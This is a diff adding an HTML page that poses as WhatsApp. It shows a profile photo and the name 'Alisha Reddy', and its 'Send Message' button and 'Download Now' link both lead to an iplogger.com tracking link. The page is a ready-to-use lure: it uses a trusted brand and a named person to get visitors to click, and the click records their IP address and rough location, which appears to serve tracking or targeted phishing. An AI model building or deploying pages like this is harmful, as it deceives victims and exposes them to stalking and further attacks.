@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://web.whatsapp.com/favicon-64x64.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="https://web.whatsapp.com/favicon-64x64.ico" type="image/x-icon">
+    <title>WhatsApp</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+        .header {
+            background-color: #25d366;
+            color: white;
+            padding: 20px 0;
+            text-align: center;
+        }
+        .features {
+            padding: 40px 0;
+        }
+        .feature {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .cta {
+            background-color: #075e54;
+            color: white;
+            padding: 40px 0;
+            text-align: center;
+        }
+        .btn-primary {
+            background-color: #25d366;
+            border: none;
+        }
+        .btn-primary:hover {
+            background-color: #128c7e;
+        }
+        .profile-section {
+            text-align: center;
+            padding: 20px;
+        }
+        .profile-image {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 5px solid #25d366;
+        }
+        @media (max-width: 768px) {
+            .profile-image {
+                width: 120px;
+                height: 120px;
+            }
+            .features .row {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Connect with WhatsApp</h1>
+        <p>Simple. Secure. Reliable messaging.</p>
+    </div>
+
+    <div class="profile-section">
+        <img id="profileImage" src="" alt="Profile" class="profile-image">
+        <h2>Alisha Reddy</h2>
+        <button class="btn btn-primary" onclick="window.location.href='https://iplogger.com/2twca7'">Send Message</button>
+    </div>
+
+    <div class="container features">
+        <div class="row">
+            <div class="col-md-4 feature">
+                <h3>Fast Messaging</h3>
+                <p>Send and receive messages quickly and easily.</p>
+            </div>
+            <div class="col-md-4 feature">
+                <h3>Secure Conversations</h3>
+                <p>End-to-end encryption for all your chats.</p>
+            </div>
+            <div class="col-md-4 feature">
+                <h3>Group Chats</h3>
+                <p>Connect with multiple people in one place.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="cta">
+        <h2>Get Started with WhatsApp Today!</h2>
+        <p>Download now and enjoy seamless communication.</p>
+        <a href="https://iplogger.com/2twca7" class="btn btn-primary btn-lg">Download Now</a>
+    </div>
+
+    <script>
+        // Local image path
+        const imagePath = 'img/2.jpeg';
+        
+        // Set the local image as the profile image
+        document.getElementById("profileImage").src = imagePath;
+    </script>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
